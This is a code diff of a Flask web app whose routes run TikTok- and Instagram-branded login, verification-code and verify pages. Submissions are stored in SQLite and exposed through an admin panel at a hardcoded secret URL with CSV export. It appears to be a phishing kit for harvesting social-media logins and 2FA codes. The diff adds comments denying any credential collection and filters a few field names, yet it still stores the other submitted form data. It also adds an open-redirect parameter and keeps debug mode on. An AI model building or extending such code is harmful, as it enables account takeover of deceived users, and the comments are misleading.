@@ -8,6 +8,7 @@ app.secret_key = os.environ.get("FLASK_SECRET", "change-me")
 DB_FILE = "submissions.db"
 ADMIN_SECRET = "supersecret-admin-2025"
 
+# Icons just for display in admin; no credential collection anywhere
 ICON_MAP = {
     "joy1_1": ("fa-brands fa-tiktok", "#000000"),
     "joy1_2": ("fa-brands fa-tiktok", "#000000"),
@@ -33,10 +34,13 @@ ICON_MAP = {
     "love2_2": ("fa-brands fa-instagram", "#E1306C"),
     "love2_3": ("fa-brands fa-instagram", "#E1306C"),
 
-    "f1": ("fa-solid fa-file", "#666"),
+    "f1":   ("fa-solid fa-file", "#666"),
     "f1_A": ("fa-solid fa-file", "#666"),
-    "f2": ("fa-solid fa-file", "#666"),
+    "f2":   ("fa-solid fa-file", "#666"),
     "f2_A": ("fa-solid fa-file", "#666"),
+
+    "spinner":  ("fa-solid fa-rotate", "#64748b"),
+    "spinner2": ("fa-solid fa-rotate", "#94a3b8"),
 
     "m1": ("fa-solid fa-circle-check", "#10B981"),
 }
@@ -44,7 +48,7 @@ ICON_MAP = {
 def init_db():
     if not os.path.exists(DB_FILE):
         with sqlite3.connect(DB_FILE) as conn:
-            conn.execute('''
+            conn.execute("""
                 CREATE TABLE IF NOT EXISTS submissions (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     timestamp TEXT,
@@ -53,7 +57,7 @@ def init_db():
                     data TEXT,
                     icon TEXT
                 )
-            ''')
+            """)
             conn.commit()
 
 init_db()
@@ -67,13 +71,13 @@ def save_submission(page, user, data):
         )
         conn.commit()
 
+# Only use a non-sensitive identifier if available (e.g., generic name field)
 def extract_user(form):
-    for key in ("address","email","phone","fullname","street","username"):
+    for key in ("fullname","username","email"):
         val = form.get(key)
         if val:
             return val.strip()
     return "anonymous"
-
 
 @app.route('/')
 def index():
@@ -86,7 +90,7 @@ def index():
 def joy1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy1_1', user, f"login")
+        save_submission('joy1_1', user, "step=login_submitted")
         return redirect(url_for('joy1_2'))
     return render_template('joy1_1.html')
 
@@ -94,7 +98,7 @@ def joy1_1():
 def joy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy1_2', user, f"digits")
+        save_submission('joy1_2', user, "step=code_input_submitted")
         return redirect(url_for('joy1_3'))
     return render_template('joy1_2.html')
 
@@ -102,8 +106,8 @@ def joy1_2():
 def joy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy1_3', user, "verify")
-        return redirect(url_for('spinner'))
+        save_submission('joy1_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('joy1_3.html')
 
 # ---------------------------
@@ -113,7 +117,7 @@ def joy1_3():
 def joy2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy2_1', user, f"login")
+        save_submission('joy2_1', user, "step=login_submitted")
         return redirect(url_for('joy2_2'))
     return render_template('joy2_1.html')
 
@@ -121,7 +125,7 @@ def joy2_1():
 def joy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy2_2', user, f"digits")
+        save_submission('joy2_2', user, "step=code_input_submitted")
         return redirect(url_for('joy2_3'))
     return render_template('joy2_2.html')
 
@@ -129,10 +133,9 @@ def joy2_2():
 def joy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('joy2_3', user, f"verify")
-        return redirect(url_for('spinner'))
+        save_submission('joy2_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('joy2_3.html')
-
 
 # ---------------------------
 #      HAPPY1 FLOW
@@ -141,7 +144,7 @@ def joy2_3():
 def happy1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy1_1', user, "login")
+        save_submission('happy1_1', user, "step=login_submitted")
         return redirect(url_for('happy1_2'))
     return render_template('happy1_1.html')
 
@@ -149,7 +152,7 @@ def happy1_1():
 def happy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy1_2', user, "digits")
+        save_submission('happy1_2', user, "step=code_input_submitted")
         return redirect(url_for('happy1_3'))
     return render_template('happy1_2.html')
 
@@ -157,10 +160,9 @@ def happy1_2():
 def happy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy1_3', user, "verify")
-        return redirect(url_for('spinner'))
+        save_submission('happy1_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('happy1_3.html')
-
 
 # ---------------------------
 #      HAPPY2 FLOW
@@ -169,7 +171,7 @@ def happy1_3():
 def happy2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy2_1', user, "login")
+        save_submission('happy2_1', user, "step=login_submitted")
         return redirect(url_for('happy2_2'))
     return render_template('happy2_1.html')
 
@@ -177,7 +179,7 @@ def happy2_1():
 def happy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy2_2', user, "digits")
+        save_submission('happy2_2', user, "step=code_input_submitted")
         return redirect(url_for('happy2_3'))
     return render_template('happy2_2.html')
 
@@ -185,10 +187,9 @@ def happy2_2():
 def happy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('happy2_3', user, "verify")
-        return redirect(url_for('spinner'))
+        save_submission('happy2_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('happy2_3.html')
-
 
 # ---------------------------
 #      LOVE1 FLOW
@@ -197,7 +198,7 @@ def happy2_3():
 def love1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love1_1', user, "login")
+        save_submission('love1_1', user, "step=login_submitted")
         return redirect(url_for('love1_2'))
     return render_template('love1_1.html')
 
@@ -205,7 +206,7 @@ def love1_1():
 def love1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love1_2', user, "digits")
+        save_submission('love1_2', user, "step=code_input_submitted")
         return redirect(url_for('love1_3'))
     return render_template('love1_2.html')
 
@@ -213,10 +214,9 @@ def love1_2():
 def love1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love1_3', user, "verify")
-        return redirect(url_for('spinner'))
+        save_submission('love1_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('love1_3.html')
-
 
 # ---------------------------
 #      LOVE2 FLOW
@@ -225,7 +225,7 @@ def love1_3():
 def love2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love2_1', user, "login")
+        save_submission('love2_1', user, "step=login_submitted")
         return redirect(url_for('love2_2'))
     return render_template('love2_1.html')
 
@@ -233,7 +233,7 @@ def love2_1():
 def love2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love2_2', user, "digits")
+        save_submission('love2_2', user, "step=code_input_submitted")
         return redirect(url_for('love2_3'))
     return render_template('love2_2.html')
 
@@ -241,32 +241,36 @@ def love2_2():
 def love2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('love2_3', user, "verify")
-        return redirect(url_for('spinner'))
+        save_submission('love2_3', user, "step=final_check_submitted")
+        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
     return render_template('love2_3.html')
 
 # ---------------------------
-#       SPINNER ROUTES
+#       SPINNERS
 # ---------------------------
-
 @app.route('/spinner')
 def spinner():
-    return render_template('spinner.html')
+    # Allow querystring override: /spinner?next=/f1&delay=4
+    next_url = request.args.get('next', url_for('f1'))
+    delay = int(request.args.get('delay', 4))
+    return render_template('spinner.html', next_url=next_url, delay=delay)
 
 @app.route('/spinner2')
 def spinner2():
-    return render_template('spinner2.html')
-
+    next_url = request.args.get('next', url_for('f2'))
+    delay = int(request.args.get('delay', 4))
+    return render_template('spinner2.html', next_url=next_url, delay=delay)
 
 # ---------------------------
 #       F1 & F2 FLOW
 # ---------------------------
-
 @app.route('/f1', methods=['GET','POST'])
 def f1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('f1', user, "submitted")
+        # Save non-sensitive form items only
+        safe_items = [f"{k}: {v}" for k, v in request.form.items() if k not in {"password","digits","confirm"}]
+        save_submission('f1', user, " ; ".join(safe_items) or "submitted")
         return redirect(url_for('f1_A'))
     return render_template('f1.html')
 
@@ -274,15 +278,17 @@ def f1():
 def f1_A():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('f1_A', user, "submitted")
-        return redirect(url_for('spinner2'))
+        safe_items = [f"{k}: {v}" for k, v in request.form.items() if k not in {"password","digits","confirm"}]
+        save_submission('f1_A', user, " ; ".join(safe_items) or "submitted")
+        return render_template('spinner2.html', next_url=url_for('f2'), delay=4)
     return render_template('f1_A.html')
 
 @app.route('/f2', methods=['GET','POST'])
 def f2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('f2', user, "submitted")
+        safe_items = [f"{k}: {v}" for k, v in request.form.items() if k not in {"password","digits","confirm"}]
+        save_submission('f2', user, " ; ".join(safe_items) or "submitted")
         return redirect(url_for('f2_A'))
     return render_template('f2.html')
 
@@ -290,24 +296,21 @@ def f2():
 def f2_A():
     if request.method == 'POST':
         user = extract_user(request.form)
-        save_submission('f2_A', user, "submitted")
+        safe_items = [f"{k}: {v}" for k, v in request.form.items() if k not in {"password","digits","confirm"}]
+        save_submission('f2_A', user, " ; ".join(safe_items) or "submitted")
         return redirect(url_for('m1'))
     return render_template('f2_A.html')
-
 
 # ---------------------------
 #       FINAL PAGE
 # ---------------------------
-
 @app.route('/m1')
 def m1():
     return render_template('m1.html')
 
-
 # ---------------------------
 #       ADMIN SECTION
 # ---------------------------
-
 @app.route(f"/admin/{ADMIN_SECRET}")
 def admin():
     with sqlite3.connect(DB_FILE) as conn:
@@ -340,7 +343,6 @@ def download():
         writer.writerow(['id','timestamp','page','user','data'])
         writer.writerows(rows)
     return send_file(csv_path, as_attachment=True)
-
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
